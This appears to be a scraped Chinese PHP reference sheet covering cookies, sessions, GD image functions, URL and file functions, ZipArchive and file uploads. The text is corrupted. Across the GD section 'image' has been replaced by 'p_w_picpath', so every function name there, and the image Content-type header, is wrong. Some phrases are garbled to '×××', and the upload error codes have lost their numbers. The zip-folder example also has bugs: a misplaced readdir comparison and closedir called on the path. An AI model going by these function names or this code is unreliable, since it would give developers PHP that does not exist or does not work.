class="line">无法给出提示，直接跳转</span><br><span class="line">// JS方法</span><br><span class="line">location.href = url</span><br><span class="line">// HTML</span><br><span class="line">&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;表示时间的数值; url=要跳转的URI&quot;&gt; </span><br><span class="line">/* 【Cookie】 */</span><br><span class="line">cookie是一种在远程浏览器端储存数据并以此来跟踪和识别用户的机制。</span><br><span class="line">cookie是HTTP标头的一部分，因此setcookie()函数必须在其它信息被输出到浏览器前调用，这和对header()函数的限制类似。可以使用输出缓冲函数来延迟脚本的输出，直到按需要设置好了所有的cookie或者其它HTTP标头。</span><br><span class="line">// 新增</span><br><span class="line">setcookie    新增一条cookie信息</span><br><span class="line">setcookie($name [,$value [,$expire [,$path [,$domain [,$secure [,$httponly]]]]]])</span><br><span class="line">#注意：setcookie()函数前不能有输出！除非开启ob缓存！</span><br><span class="line"># 参数说明</span><br><span class="line">$name    - cookie的识别名称</span><br><span class="line">    使用$_COOKIE[&#x27;name&#x27;]抵用名为name的cookie</span><br><span class="line">$value    - cookie值，可以为数值或字符串，此值保存在客户端，不要用来保存敏感数据</span><br><span class="line">    假定$name参数的值为&#x27;name&#x27;，则$_COOKIE[&#x27;name&#x27;]就可取得该$value值</span><br><span class="line">$expire    - cookie的生存期限（Unix时间戳，秒数）</span><br><span class="line">    如果$expire参数的值为time()+60*60*24*7则可设定cookie在一周后失效。如果未设定该参数，则会话后立即失效。</span><br><span class="line">$path    - cookie在服务器端的指定路径。当设定该值时，服务器中只有指定路径下的网页或程序可以存取该cookie。</span><br><span class="line">    如果该参数值为&#x27;/&#x27;，则cookie在整个domain内有效。</span><br><span class="line">    如果设为&#x27;/foo/&#x27;，则cookie就在domain下的/foo/目录及其子目录内有效。</span><br><span class="line">    默认值为设定cookie的当前目录及其子目录。</span><br><span class="line">$domain    - 指定此cookie所属服务器的网址名称，预设是建立此cookie服务器的网址。</span><br><span class="line">    要是cookie能在如abc.com域名下的所有子域都有效，则该参赛应设为&#x27;.abc.com&#x27;。</span><br><span class="line">$secure    - 指明cookie是否仅通过安全的HTTPS连接传送中的cookie的安全识别常数，如果设定该值则代表只有在某种情况下才能在客户端与服务端之间传递。</span><br><span class="line">    当设成true时，cookie仅在安全的连接中被设置。默认值为false。</span><br><span class="line">// 读取</span><br><span class="line">- 浏览器请求时会携带当前域名下的所有cookie信息到服务器。</span><br><span class="line">- 任何从客户端发送的cookie都会被自动存入$_COOKIE全局数组。</span><br><span class="line">- 如果希望对一个cookie变量设置多个值，则需在cookie的名称后加[]符号。即以数组形态保存多条数据到同一变量。</span><br><span class="line">    //设置为$_COOKIE[&#x27;user&#x27;][&#x27;name&#x27;]，注意user[name]的name没有引号</span><br><span class="line">    setcookie(&#x27;user[name]&#x27;, &#x27;shocker&#x27;);</span><br><span class="line">- $_COOKIE也可以为索引数组</span><br><span class="line">// 删除</span><br><span class="line">方法1：将其值设置为空字符串</span><br><span class="line">    setcookie(&#x27;user[name]&#x27;, &#x27;&#x27;);</span><br><span class="line">方法2：将目标cookie设为“已过期”状态。</span><br><span class="line">    //将cookie的生存时间设置为过期，则生存期限与浏览器一样，当浏览器关闭时就会被删除。</span><br><span class="line">    setcookie(&#x27;usr[name]&#x27;, &#x27;&#x27;, time()-1);</span><br><span class="line"># 注意：</span><br><span class="line">1. cookie只能保存字符串数据</span><br><span class="line">2. $_COOKIE只用于接收cookie数据，不用于设置或管理cookie数据。</span><br><span class="line">    对$_COOKIE进行操作不会影响cookie数据。</span><br><span class="line">    $_COOKIE只会保存浏览器在请求时所携带的cookie数据。</span><br><span class="line">3. cookie生命周期：</span><br><span class="line">    临时cookie：浏览器关闭时被删除</span><br><span class="line">    持久cookie：$expire参数为时间戳，表示失效时间。</span><br><span class="line">4. 有效目录</span><br><span class="line">    cookie只在指定的目录有效。默认是当前目录及其子目录。</span><br><span class="line">    子目录的cookie在其父目录或同级目录不可获取。</span><br><span class="line">5. cookie区分域名</span><br><span class="line">    默认是当前域名及其子域名有效。</span><br><span class="line">6. js中通过document.cookie获得，类型为字符串</span><br><span class="line">7. 浏览器对COOKIE总数没有限制，但对每个域名的COOKIE数量和每个COOKIE的大小有限，而且不同浏览器的限制不同。</span><br><span class="line">/* 【session】 */</span><br><span class="line">1. 开启session机制</span><br><span class="line">    session_start()</span><br><span class="line">    注意：session_start()函数前不能有输出！除非开启ob缓存。</span><br><span class="line">2. 操作数据</span><br><span class="line">    对$_SESSION数组进行操作</span><br><span class="line">3. 浏览器端保存SessionID，默认为当前域名下的所有目录及其子目录生效。即默认设置cookie的path值为&#x27;/&#x27;</span><br><span class="line">4. 服务器保存session数据</span><br><span class="line">    默认保存方式：每个会话都会生成一个session数据文件，文件名为：sess_加SessionID</span><br><span class="line">5. session可以存储除了资源以外的任何类型数据。</span><br><span class="line">    数据被序列化后再保存到文件中。</span><br><span class="line">6. $_SESSION的元素下标不能为整型！</span><br><span class="line">    因为只对元素值进行序列化。</span><br><span class="line">    元素内的数组下标无此要求。</span><br><span class="line">7. 生存周期</span><br><span class="line">    默认是浏览器关闭</span><br><span class="line">        因为浏览器保存的cookie变量SessionID是临时的</span><br><span class="line">        但是服务器端的session数据文件不一定消失（需要等待session的垃圾回收机制来处理）</span><br><span class="line">    可以延长cookie中PHPSESSID变量的生命周期。（不推荐）</span><br><span class="line">    php.ini配置session.gc_maxlifetime</span><br><span class="line">8. 删除数据</span><br><span class="line">    $_SESSION变量在脚本结束时依然会消失。开启session机制时会造出$_SESSION变量。</span><br><span class="line">    $_SESSION与保存session数据的文件是两个空间。</span><br><span class="line">    unset($_SESSION[&#x27;key&#x27;])只是删除数组内的该元素，不会立即相应到保存session数据的文件上。</span><br><span class="line">        等到脚本结束，才会将$_SESSION的数据写入到该文件中。</span><br><span class="line">    session_destroy()    销毁保存session数据的文件，也不会对该文件写入内容。</span><br><span class="line">        并不删除$_SESSION变量，unset或脚本结束才会删除该变量。</span><br><span class="line">    如何完全删除一个session？需删除3部分</span><br><span class="line">        unset($_SESSION);    </span><br><span class="line">            删除$_SESSION变量后，数据文件并未被改动。如果单独使用unset，则需先置空$_SESSION = array()</span><br><span class="line">        session_destroy();</span><br><span class="line">        setcookie(&#x27;PHPSESSID&#x27;, &#x27;&#x27;, time()-1); //保险做法是将其生命周期失效</span><br><span class="line">    整个脚本周期内，只对数据文件读一次、写一次。</span><br><span class="line">// 重写session的存储机制</span><br><span class="line"># session存储方式</span><br><span class="line">session.save_handler = user|files|memcache</span><br><span class="line"># 因数据文件过多导致的问题，可通过分子目录保存进行解决</span><br><span class="line">PHP配置文件下session.save_path选项，并需手动创建数据存放目录。</span><br><span class="line">在该配置选项前加层级。分布子目录的原则，利用会话ID的相应字母来分配子目录。仍需手动创建子目录。</span><br><span class="line">session.save_path = &quot;2; F:/PHPJob/Temp&quot;</span><br><span class="line"># 多服务器数据共享问题</span><br><span class="line"># 数据存储操作：</span><br><span class="line">    初始化$open、释放资源$close、读$read、写$write、销毁存储介质$destroy(调用session_destroy时触发该操作)、垃圾回收$gc</span><br><span class="line"># 会话ID的长度可变。不同的设置方式导致不同长度的会话ID。</span><br><span class="line">session.hash_function   允许用户指定生成会话ID的散列算法。</span><br><span class="line">    &#x27;0&#x27; 表示MD5（128 位），&#x27;1&#x27; 表示SHA-1（160 位）。</span><br><span class="line">session.hash_bits_per_character    允许用户定义将二进制散列数据转换为可读的格式时每个字符存放多少个比特。</span><br><span class="line">    可能值为 &#x27;4&#x27;（0-9，a-f），&#x27;5&#x27;（0-9，a-v），以及 &#x27;6&#x27;（0-9，a-z，A-Z，&quot;-&quot;，&quot;,&quot;）。</span><br><span class="line">    总hash长度为128bit，会话ID长度为128/可能值，4-&gt;32, 5-&gt;26, 6-&gt;22</span><br><span class="line"># 自定义数据存储操作方法</span><br><span class="line"># 注意：不用关心PHP如何序列化、反序列化、如何得到数据和写入数据，只做与数据存储相关的操作</span><br><span class="line">session_set_save_handler    设置用户自定义的会话数据存储函数</span><br><span class="line">    bool session_set_save_handler(callable $open, callable $close, callable $read, callable $write, callable $destroy, callable $gc)</span><br><span class="line">执行顺序：open,  close, read, write, destroy, gc</span><br><span class="line"># 先设置处理器，再开启会话</span><br><span class="line"># 常用函数</span><br><span class="line">session_start        开启或恢复会话机制</span><br><span class="line">session_id            获取或设置当前会话ID</span><br><span class="line">session_destroy        销毁当前会话的所有数据（销毁数据文件）</span><br><span class="line">session_name        获取或设置当前会话名称（cookie变量名，默认为PHPSESSID）</span><br><span class="line">session_save_path    获取或设置当前会话数据文件保存路径</span><br><span class="line">session_set_save_handler    设置用户自定义的会话数据存储函数</span><br><span class="line">session_unset        释放所有会话变量(清空$_SESSION数组元素)</span><br><span class="line">session_encode        将当前会话数据编码为一个字符串</span><br><span class="line">session_decode        将字符串解译为会话数据</span><br><span class="line">session_write_close    写入会话数据并关闭会话</span><br><span class="line">session_register_shutdown    关闭会话</span><br><span class="line">session_set_cookie_params    设置会话cookie变量，必须在session_start()前使用。</span><br><span class="line">    session_set_cookie_params(0,&quot;/webapp/&quot;); //设置session生存时间</span><br><span class="line">session_get_cookie_params    获取会话cookie变量。返回包含当前会话cookie信息的数组</span><br><span class="line"># 配置php.ini</span><br><span class="line">ini_set($varname, $newvalue);</span><br><span class="line">    //该函数的配置只对当前脚本生效</span><br><span class="line">    //并非所有php.ini设置均可用该函数设置</span><br><span class="line">ini_get($varname)   //获取某配置项信息</span><br><span class="line">ini_get_all([str $extension])   //返回所有配置项信息的数组</span><br><span class="line"># session扩展配置</span><br><span class="line">session.name    指定会话名以用作cookie的名字。只能由字母数字组成，默认为PHPSESSID。</span><br><span class="line">session.save_path   定义了传递给存储处理器的参数。</span><br><span class="line">    如果选择了默认的files文件处理器，则此值是创建文件的路径。默认为/tmp。</span><br><span class="line">    可选的N参数来决定会话文件分布的目录深度。</span><br><span class="line">    要使用N参数，必须在使用前先创建好这些目录。在ext/session目录下有个小的shell脚本名叫mod_files.sh可以用来做这件事。</span><br><span class="line">    如果使用了N参数并且N大于0，那么将不会执行自动垃圾回收。</span><br><span class="line">session.save_handler    定义了来存储和获取与会话关联的数据的处理器的名字。默认为files。</span><br><span class="line">    如果用户自定义存储器，则该值改为user。</span><br><span class="line">    ini_set(&#x27;session.save_handler&#x27;, &#x27;user&#x27;);//此设置只针对当前脚本生效。</span><br><span class="line">session.auto_start  指定会话模块是否在请求开始时自动启动一个会话。默认为 0（不启动）。</span><br><span class="line">session.gc_probability与session.gc_divisor合起来定义了在每个会话初始化时启动gc（garbage collection 垃圾回收）进程的概率。此概率用 gc_probability/gc_divisor 计算得来。例如 1/100 意味着在每个请求中有 1% 的概率启动gc进程。session.gc_divisor默认为100。session.gc_probability默认为1。</span><br><span class="line">/* 【图片生成与处理】 */GD库</span><br><span class="line">// 画布生成</span><br><span class="line"># 新建画布</span><br><span class="line">p_w_picpathcreate             新建一个基于调色板的图像</span><br><span class="line">    resource p_w_picpathcreate(int $x_size, int $y_size)</span><br><span class="line">p_w_picpathcreatetruecolor    新建一个真彩×××像</span><br><span class="line"># 基于已有文件或URL创建画布</span><br><span class="line">p_w_picpathcreatefromgd2      从GD2文件或URL新建一图像</span><br><span class="line">p_w_picpathcreatefromgd2part  从给定的GD2文件或URL中的部分新建一图像</span><br><span class="line">p_w_picpathcreatefromgd       从GD文件或URL新建一图像</span><br><span class="line">p_w_picpathcreatefromgif      由文件或URL创建一个新图象</span><br><span class="line">p_w_picpathcreatefromjpeg     由文件或URL创建一个新图象</span><br><span class="line">p_w_picpathcreatefrompng      由文件或URL创建一个新图象</span><br><span class="line">p_w_picpathcreatefromstring   从字符串中的图像流新建一图像</span><br><span class="line">p_w_picpathcreatefromwbmp     由文件或URL创建一个新图象</span><br><span class="line">p_w_picpathcreatefromxbm      由文件或URL创建一个新图象</span><br><span class="line">p_w_picpathcreatefromxpm      由文件或URL创建一个新图象</span><br><span class="line">// 颜色分配</span><br><span class="line">p_w_picpathcolorallocate          为一幅图像分配颜色</span><br><span class="line">    int p_w_picpathcolorallocate(resource $p_w_picpath, int $red, int $green, int $blue)</span><br><span class="line">p_w_picpathcolorallocatealpha     为一幅图像分配颜色 + alpha</span><br><span class="line">p_w_picpathcolordeallocate        取消图像颜色的分配</span><br><span class="line">p_w_picpathcolortransparent       将某个颜色定义为透明色</span><br><span class="line">p_w_picpathcolorat            取得某像素的颜色索引值</span><br><span class="line">p_w_picpathcolorclosest       取得与指定的颜色最接近的颜色的索引值</span><br><span class="line">p_w_picpathcolorclosestalpha  取得与指定的颜色加透明度最接近的颜色</span><br><span class="line">p_w_picpathcolorclosesthwb    取得与给定颜色最接近的色度的黑白色的索引</span><br><span class="line">p_w_picpathcolorexact         取得指定颜色的索引值</span><br><span class="line">p_w_picpathcolorexactalpha    取得指定的颜色加透明度的索引值</span><br><span class="line">p_w_picpathcolormatch         使一个图像中调色板版本的颜色与真彩色版本更能匹配</span><br><span class="line">p_w_picpathcolorresolve       取得指定颜色的索引值或有可能得到的最接近的替代值</span><br><span class="line">p_w_picpathcolorresolvealpha  取得指定颜色 + alpha 的索引值或有可能得到的最接近的替代值</span><br><span class="line">p_w_picpathcolorset           给指定调色板索引设定颜色</span><br><span class="line">p_w_picpathcolorsforindex     取得某索引的颜色</span><br><span class="line">p_w_picpathcolorstotal        取得一幅图像的调色板中颜色的数目</span><br><span class="line">// 区域填充</span><br><span class="line">p_w_picpathfill   区域填充</span><br><span class="line">    bool p_w_picpathfill(resource $p_w_picpath, int $x, int $y, int $color)</span><br><span class="line">p_w_picpathfilledarc          画一椭圆弧且填充</span><br><span class="line">p_w_picpathfilledellipse      画一椭圆并填充</span><br><span class="line">p_w_picpathfilledpolygon      画一多边形并填充</span><br><span class="line">p_w_picpathfilledrectangle    画一矩形并填充</span><br><span class="line">p_w_picpathfilltoborder       区域填充到指定颜色的边界为止</span><br><span class="line">p_w_picpathsettile    设定用于填充的贴图</span><br><span class="line">// 图形创建</span><br><span class="line">p_w_picpatharc        画椭圆弧</span><br><span class="line">p_w_picpathchar       水平地画一个字符</span><br><span class="line">p_w_picpathcharup     垂直地画一个字符</span><br><span class="line">p_w_picpathdashedline 画一虚线</span><br><span class="line">p_w_picpathellipse    画一个椭圆</span><br><span class="line">p_w_picpathline       画一条线段</span><br><span class="line">p_w_picpathpolygon    画一个多边形</span><br><span class="line">p_w_picpathrectangle  画一个矩形</span><br><span class="line">p_w_picpathsetpixel   画一个单一像素</span><br><span class="line">p_w_picpathsx         取得图像宽度</span><br><span class="line">p_w_picpathsy         取得图像高度</span><br><span class="line">// 画笔设置</span><br><span class="line">p_w_picpathsetbrush   设定画线用的画笔图像</span><br><span class="line">p_w_picpathsetstyle   设定画线的风格</span><br><span class="line">p_w_picpathsetthickness   设定画线的宽度</span><br><span class="line">// 图形拷贝</span><br><span class="line">p_w_picpathcopy           拷贝图像的一部分</span><br><span class="line">p_w_picpathcopymerge      拷贝并合并图像的一部分</span><br><span class="line">p_w_picpathcopymergegray  用灰度拷贝并合并图像的一部分</span><br><span class="line">p_w_picpathcopyresampled  重采样拷贝部分图像并调整大小</span><br><span class="line">p_w_picpathcopyresized    拷贝部分图像并调整大小</span><br><span class="line">// 字符创建</span><br><span class="line">p_w_picpathstring         水平地画一行字符串</span><br><span class="line">p_w_picpathstringup       垂直地画一行字符串</span><br><span class="line">p_w_picpathpsslantfont    倾斜某字体</span><br><span class="line">p_w_picpathfontheight     取得字体高度</span><br><span class="line">p_w_picpathfontwidth      取得字体宽度</span><br><span class="line">p_w_picpathttfbbox        取得使用 TrueType 字体的文本的范围</span><br><span class="line">p_w_picpathloadfont       载入一新字体</span><br><span class="line">p_w_picpathpsencodefont   改变字体中的字符编码矢量</span><br><span class="line">p_w_picpathpsextendfont   扩充或精简字体</span><br><span class="line">// 导出画布为图片</span><br><span class="line">p_w_picpathgif    以GIF格式将图像输出到浏览器或文件</span><br><span class="line">p_w_picpathpng    以PNG格式将图像输出到浏览器或文件</span><br><span class="line">p_w_picpathjpeg   以JPEG格式将图像输出到浏览器或文件</span><br><span class="line">p_w_picpathwbmp   以WBMP格式将图像输出到浏览器或文件</span><br><span class="line">通过header()发送 &quot;Content-type: p_w_picpath/图片格式&quot; 可以使PHP脚本直接输出图像。</span><br><span class="line">    header(&quot;Content-type: p_w_picpath/gif&quot;); p_w_picpathgif($im);</span><br><span class="line">p_w_picpathgd     将 GD 图像输出到浏览器或文件</span><br><span class="line">p_w_picpathgd2    将 GD2 图像输出到浏览器或文件</span><br><span class="line">// 释放画布资源</span><br><span class="line">p_w_picpathdestroy    销毁图像</span><br><span class="line">// 图像信息</span><br><span class="line">p_w_picpath_type_to_extension     取得图像类型的文件后缀</span><br><span class="line">getp_w_picpathsize                取得图像大小</span><br><span class="line">p_w_picpathsx                     取得图像宽度</span><br><span class="line">p_w_picpathsy                     取得图像高度</span><br><span class="line">p_w_picpathistruecolor            检查图像是否为真彩×××像</span><br><span class="line">p_w_picpathtypes                  返回当前 PHP 版本所支持的图像类型</span><br><span class="line">// 图像设置</span><br><span class="line">p_w_picpathrotate         用给定角度旋转图像</span><br><span class="line">p_w_picpathalphablending  设定图像的混色模式</span><br><span class="line">p_w_picpathantialias      是否使用抗锯齿（antialias）功能</span><br><span class="line">p_w_picpathfilter         对图像使用过滤器</span><br><span class="line">p_w_picpathgammacorrect   对 GD 图像应用 gamma 修正</span><br><span class="line">p_w_picpathinterlace      激活或禁止隔行扫描</span><br><span class="line">/* 【缩略图】【水印】 */</span><br><span class="line">p_w_picpathcopyresampled  重采样拷贝部分图像并调整大小</span><br><span class="line">    bool p_w_picpathcopyresampled ( resource $dst_p_w_picpath , resource $src_p_w_picpath , int $dst_x , int $dst_y , int $src_x , int $src_y , int $dst_w , int $dst_h , int $src_w , int $src_h )</span><br><span class="line">p_w_picpathcopymerge      拷贝并合并图像的一部分</span><br><span class="line">    bool p_w_picpathcopymerge ( resource $dst_im , resource $src_im , int $dst_x , int $dst_y , int $src_x , int $src_y , int $src_w , int $src_h , int $pct )</span><br><span class="line">getp_w_picpathsize        取得图像大小</span><br><span class="line">    array getp_w_picpathsize ( string $filename [, array &amp;$p_w_picpathinfo ] )</span><br><span class="line">/* 【URL函数】 */</span><br><span class="line">get_headers — 取得服务器响应一个 HTTP 请求所发送的所有标头</span><br><span class="line">get_meta_tags — 从一个文件中提取所有的 meta 标签 content 属性，返回一个数组</span><br><span class="line">http_build_query — 生成 URL-encode 之后的请求字符串</span><br><span class="line">urldecode — 解码已编码的URL字符串</span><br><span class="line">urlencode — 编码URL字符串</span><br><span class="line">parse_url — 解析URL，返回其组成部分</span><br><span class="line">    &#x27;http://username:password@hostname/path?arg=value#anchor&#x27;</span><br><span class="line">    scheme(如http), host, port, user, pass, path, query(在问号?之后), fragment(在散列符号#之后)</span><br><span class="line">//编码可用于交换多个变量</span><br><span class="line">$a = &#x27;中国&#x27;;</span><br><span class="line">$b = &#x27;四川&#x27;;</span><br><span class="line">$a = urlencode($a);</span><br><span class="line">$b = urlencode($b);</span><br><span class="line">$a = $a.&#x27;&amp;&#x27;.$b;</span><br><span class="line">$b = explode(&#x27;&amp;&#x27;, $a);</span><br><span class="line">$a = urldecode($b[1]);</span><br><span class="line">$b = urldecode($b[0]);</span><br><span class="line">echo $a, $b;</span><br><span class="line">//list()函数用于交换变量</span><br><span class="line">list($a, $b) = array($b, $a);</span><br><span class="line">/* 【文件、目录】 */</span><br><span class="line">dirname($path)  返回路径中的目录部分</span><br><span class="line">basename($path [,$suffix])  返回路径中的文件名部分</span><br><span class="line">pathinfo($path [,$options]) 返回文件路径的信息(数组元素：dirname,basename,extension)</span><br><span class="line">realpath($path) 返回规范化的绝对路径名</span><br><span class="line">copy($source, $dest)    拷贝文件</span><br><span class="line">unlink($file)   删除文件</span><br><span class="line">rename($old, $new)  重命名或移动一个文件或目录</span><br><span class="line">mkdir($path [,$mode [,$recursive]]) 新建目录</span><br><span class="line">    $mode表示权限，默认0777</span><br><span class="line">    $recursive表示可创建多级目录，默认false</span><br><span class="line">rmdir($dir)     删除目录(目录必须为空，且具有权限)</span><br><span class="line">file_exists($file)  检查文件或目录是否存在</span><br><span class="line">is_file($file)      判断文件是否存在且为正常的文件</span><br><span class="line">is_dir($file)       判断文件名是否存在且为目录</span><br><span class="line">is_readable($file)  判断文件或目录是否可读</span><br><span class="line">is_writable($file)  判断文件或目录是否可写</span><br><span class="line">is_executable($file)    判断给定文件名是否可执行</span><br><span class="line">is_link($file)      判断给定文件名是否为一个符号连接</span><br><span class="line">tmpfile(void)   建立一个临时文件</span><br><span class="line">tempnam($dir, $prefix)  在指定目录中建立一个具有唯一文件名的文件</span><br><span class="line">file($file) 把整个文件读入一个数组中</span><br><span class="line">fopen($filename, $mode [,$use_include_path])</span><br><span class="line">    $mode参数：(加入&#x27;b&#x27;标记解决移植性)</span><br><span class="line">        &#x27;r&#x27;     只读方式打开，将文件指针指向文件头。</span><br><span class="line">        &#x27;r+&#x27;    读写方式打开，将文件指针指向文件头。</span><br><span class="line">        &#x27;w&#x27;     写入方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建之。</span><br><span class="line">        &#x27;w+&#x27;    读写方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建之。</span><br><span class="line">        &#x27;a&#x27;     写入方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建之。</span><br><span class="line">        &#x27;a+&#x27;    读写方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建之。</span><br><span class="line">        &#x27;x&#x27;     创建并以写入方式打开，将文件指针指向文件头。</span><br><span class="line">        &#x27;x+&#x27;    创建并以读写方式打开，将文件指针指向文件头。</span><br><span class="line">fclose($handle) 关闭一个已打开的文件指针</span><br><span class="line">fread($handle, $length) 读取文件（可安全用于二进制文件）</span><br><span class="line">fwrite($handle, $string [,$length]) 写入文件（可安全用于二进制文件）</span><br><span class="line">rewind($handle) 倒回文件指针的位置</span><br><span class="line">ftell($handle)  返回文件指针读/写的位置</span><br><span class="line">fseek($handle, $offset [,$whence])  在文件指针中定位</span><br><span class="line">feof($handle)   测试文件指针是否到了文件结束的位置</span><br><span class="line">fgets   从文件指针中读取一行</span><br><span class="line">fgetss  从文件指针中读取一行并过滤掉HTML标记</span><br><span class="line">flock($handle, $opt) 轻便的咨询文件锁定</span><br><span class="line">    $opt：LOCK_SH 取得共享锁定（读取的程序）；LOCK_EX 取得独占锁定（写入的程序）；LOCK_UN 释放锁定（无论共享或独占）</span><br><span class="line">readfile($file) 读入一个文件并写入到输出缓冲</span><br><span class="line">fflush($handle) 将缓冲内容输出到文件</span><br><span class="line">touch($file [,$time [,$atime]])   设定文件的访问和修改时间</span><br><span class="line">fileatime   取得文件的上次访问时间</span><br><span class="line">filectime   取得文件的inode修改时间</span><br><span class="line">filegroup   取得文件的组</span><br><span class="line">fileinode   取得文件的inode</span><br><span class="line">filemtime   取得文件修改时间</span><br><span class="line">fileowner   取得文件的所有者</span><br><span class="line">fileperms   取得文件的权限</span><br><span class="line">filesize    取得文件大小</span><br><span class="line">filetype    取得文件类型</span><br><span class="line">/* fileinfo */ 获取/设置文件信息</span><br><span class="line">#扩展Fileinfo，配置php.ini</span><br><span class="line">#extension=php_fileinfo.dll</span><br><span class="line">finfo_open([$opt]) //创建一个文件信息资源</span><br><span class="line">finfo_file($finfo, $file [,$opt]) //获取文件信息</span><br><span class="line">finfo_set_flags($finfo, $opt) //设置文件信息项</span><br><span class="line">finfo_close($finfo) //关闭文件信息资源</span><br><span class="line">mime_content_type($file) //获取文件的MIME类型</span><br><span class="line">$opt参数选项：</span><br><span class="line">FILEINFO_MIME_ENCODING 文件编码类型</span><br><span class="line">FILEINFO_MIME_TYPE 文件MIME类型</span><br><span class="line">//目录</span><br><span class="line">chdir($dir)         改变当前目录</span><br><span class="line">chroot($dir)        将当前目录改变为当前进程的根目录</span><br><span class="line">closedir($handle)   关闭目录句柄</span><br><span class="line">dir($dir)           返回一个目录的实例对象</span><br><span class="line">getcwd()            取得当前工作目录</span><br><span class="line">opendir($path)      打开目录句柄</span><br><span class="line">readdir($handle)    从目录句柄中读取条目</span><br><span class="line">rewinddir($handle)  倒回目录句柄</span><br><span class="line">scandir($dir [,$order])     列出指定路径中的文件和目录</span><br><span class="line">glob($pattern [,$flags])    寻找与模式匹配的文件路径</span><br><span class="line">    $flags：</span><br><span class="line">        GLOB_MARK - 在每个返回的项目中加一个斜线  </span><br><span class="line">        GLOB_NOSORT - 按照文件在目录中出现的原始顺序返回（不排序）  </span><br><span class="line">        GLOB_NOCHECK - 如果没有文件匹配则返回用于搜索的模式  </span><br><span class="line">        GLOB_NOESCAPE - 反斜线不转义元字符  </span><br><span class="line">        GLOB_BRACE - 扩充 &#123;a,b,c&#125; 来匹配 &#x27;a&#x27;，&#x27;b&#x27; 或 &#x27;c&#x27;  </span><br><span class="line">        GLOB_ONLYDIR - 仅返回与模式匹配的目录项 </span><br><span class="line">    查找多种后缀名文件：glob(&#x27;*.&#123;php,txt&#125;&#x27;, GLOB_BRACE);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 解压缩 */</span><br><span class="line">//新建ZipArchive对象</span><br><span class="line">$zip = new ZipArchive;</span><br><span class="line">//打开ZIP文件</span><br><span class="line">$zip-&gt;open($file [,$flags]);</span><br><span class="line">    $flags：</span><br><span class="line">        ZIPARCHIVE::OVERWRITE 覆盖(不存在会自动创建)</span><br><span class="line">        ZIPARCHIVE::CREATE 添加(不存在会自动创建)</span><br><span class="line">        ZIPARCHIVE::EXCL</span><br><span class="line">        ZIPARCHIVE::CHECKCONS</span><br><span class="line">//关闭正在处理的ZIP文件</span><br><span class="line">//解压缩ZIP文件</span><br><span class="line">$zip-&gt;extractTo($dest, [$entries]);</span><br><span class="line">    $dest：解压到的文件夹，$entries：解压的条目</span><br><span class="line">//添加文件到ZIP文件</span><br><span class="line">$zip-&gt;addFile($file, [$newname]);   </span><br><span class="line">    $newname可以为&quot;dir/file&quot;，这样可以将文件添加到压缩文件中的某个目录下。其他函数也如此。</span><br><span class="line">//添加文件到ZIP文件，而内容来自字符串</span><br><span class="line">$zip-&gt;addFromString($file, $str);</span><br><span class="line">//添加空文件夹到ZIP文件</span><br><span class="line">$zip-&gt;addEmptyDir($dir);</span><br><span class="line">//通过索引删除ZIP中的文件或文件夹</span><br><span class="line">$zip-&gt;deleteIndex($index);</span><br><span class="line">//通过名称删除ZIP中的文件或文件夹</span><br><span class="line">$zip-&gt;deleteName($name);</span><br><span class="line">//设置ZIP文件注释</span><br><span class="line">$zip-&gt;setArchiveComment($str);</span><br><span class="line">//获取ZIP文件注释</span><br><span class="line">$zip-&gt;getArchiveComment();</span><br><span class="line">//通过索引获取文件内容</span><br><span class="line">$zip-&gt;getFromIndex($index);</span><br><span class="line">//通过名称获取文件内容</span><br><span class="line">$zip-&gt;getFromName($name);</span><br><span class="line">//获取索引文件的文件名称</span><br><span class="line">$zip-&gt;getNameIndex($index);</span><br><span class="line">//通过索引重命名文件</span><br><span class="line">$zip-&gt;renameIndex($index, $newname);</span><br><span class="line">//通过名称重命名文件</span><br><span class="line">$zip-&gt;renameName($name, $newname);</span><br><span class="line"> </span><br><span class="line">//若将文件夹内容打包成ZIP文件，需循环文件夹的所有目录及文件</span><br><span class="line">function addFileToZip($path, $zip) &#123;</span><br><span class="line">    //打开当前文件夹$path</span><br><span class="line">    $handle = opendir($path);</span><br><span class="line">    //循环读取子文件夹及文件</span><br><span class="line">    //为防止文件名本身可被转换为false的情况(比如为&quot;0&quot;)，则需用不全等!==</span><br><span class="line">    while ($file = readdir($handle) !== false) &#123;</span><br><span class="line">        //过滤假文件夹</span><br><span class="line">        if ($file != &#x27;.&#x27; &amp;&amp; $file != &#x27;..&#x27;) &#123;</span><br><span class="line">            //对于子文件夹则递归调用本函数</span><br><span class="line">            if (is_dir($path . &#x27;/&#x27; . $file)) &#123;</span><br><span class="line">                addFileToZip($path.&#x27;/&#x27;.$file, $zip);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                //将文件添加到ZIP对象</span><br><span class="line">                $zip-&gt;addFile($path . &#x27;/&#x27; . $file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //关闭文件夹$path</span><br><span class="line">    closedir($path);</span><br><span class="line">&#125;</span><br><span class="line">// ----- END 解压缩 ----- //</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【文件上传】 */</span><br><span class="line">enctype=&quot;multipart/form-data&quot;   //FORM标签必须的属性</span><br><span class="line">$_FILES 上传文件信息数组变量</span><br><span class="line">error   上传错误信息</span><br><span class="line">  无错误</span><br><span class="line">  文件大小超过php.ini配置</span><br><span class="line">        1) upload_max_filesize 允许上传的最大文件大小</span><br><span class="line">        2) post_max_size 最大的POST数据大小</span><br><span class="line">        3) memory_limit 每个脚本能够使用的最大内存数量(默认128MB)</span><br><span class="line">  文件大小超过浏览器表单配置</span><br><span class="line">        MAX_FILE_SIZE   表示表单数据最大文件大小，该元素需在文件上传域之前。(默认2M)</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;102400&quot;&gt;</span><br><span class="line">  文件只有部分被上传</span><br><span class="line">  文件没有被上传</span><br><span class="line">    6,7 临时文件写入时失败</span><br><span class="line">  找不到临时文件</span><br><span class="line">  文件写入失败</span><br><span class="line">name    文件名</span><br><span class="line">type    文件类型</span><br><span class="line">tmp_name    上传文件临时路径</span><br><span class="line">size    文件大小</span><br><span class="line">move_uploaded_file($path, $newpath);    //将上传的文件移动到新位置</span><br><span class="line">is_uploaded_file($file) //判断是否为POST上传的文件</span><br><span 